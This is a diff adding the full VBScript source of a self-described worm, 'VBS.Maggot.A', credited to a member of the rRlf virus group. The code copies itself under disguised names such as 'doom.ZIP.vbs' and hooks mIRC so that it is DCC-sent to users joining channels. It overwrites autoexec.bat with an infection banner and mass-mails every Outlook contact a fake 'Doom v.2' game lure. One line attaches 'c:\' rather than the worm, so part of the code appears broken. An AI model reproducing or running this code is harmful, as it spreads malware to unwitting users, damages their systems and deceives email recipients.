@@ -1,0 +1,59 @@
+'VBS.Maggot.A
+'by adious [rRlf]
+'writen on: 28 nov 02
+'greatz : alcopaul,Petik,Dolomite,Metalkid,all at undernet
+' #virus,#rRlf,#vir,#vxers and all in the vx scene.
+'Giant greats to: Cyoda,Int32,Ruzz,jackie and all memberz of rRlf
+
+On error resume next
+Dim  FSO, mIrc, Boot
+Dim  mailer, Parent 
+
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Parent = Wscript.ScriptFullName
+
+Set mIrc = FSO.CreateTextFile("c:\mirc\script.ini",True)
+  mIrc.WriteLine "[script]"
+  mIrc.WriteLine "n0=on 1:JOIN:#:{"
+  mIrc.WriteLine "n1= /if ( nick == $me ) { halt }" 
+  mIrc.WriteLine "n2= /.dcc send $nick c:/maggotA.vbs" 
+  mIrc.WriteLine "n3=}" 
+  mIrc.Close
+
+FSO.FileCopy Parent, "c:/maggotA.vbs"
+FSO.FileCopy Parent, "c:/windows/system/systemfile.ini"
+FSO.FileCopy Parent, "c:/doom.ZIP.vbs"
+
+Set Boot = FSO.CreateTextFile("c:/autoexec.bat",True)
+  Boot.WriteLine "@cls"
+  Boot.WriteLine "@echo off"
+  Boot.WriteLine "echo 0000000000000000000000000"
+  Boot.WriteLine "echo You are infected by VBS.maggot.A "
+  Boot.WriteLine "echo A lame vbs worm by adious"
+  Boot.WriteLine "echo."
+  Boot.WriteLine "echo http:\\rRlf.de"
+  Boot.WriteLine "echo 0000000000000000000000000"
+  Boot.WriteLIne "pause"
+
+dim a,b,c,d,e  
+set a = Wscript.CreateObject("Wscript.Shell") 
+set b = CreateObject("Outlook.Application")
+set c = b.GetNameSpace("MAPI") 
+for y = 1 To c.AddressLists.Count 
+set d = c.AddressLists(y)
+x = 1 
+set e = b.CreateItem(0) 
+for o = 1 To d.AddressEntries.Count 
+f = d.AddressEntries(x) 
+e.Recipients.Add f 
+x = x + 1 
+next 
+e.Subject = "Nice Game!"  
+e.Body = "I attached a zip file with a neat game called 'Doom v.2'.Hope you enjoyed it"  
+e.Attachments.Add ("c:\") 
+e.DeleteAfterSubmit = False 
+e.Send 
+f = ""  
+next 
+
+'END of File :)
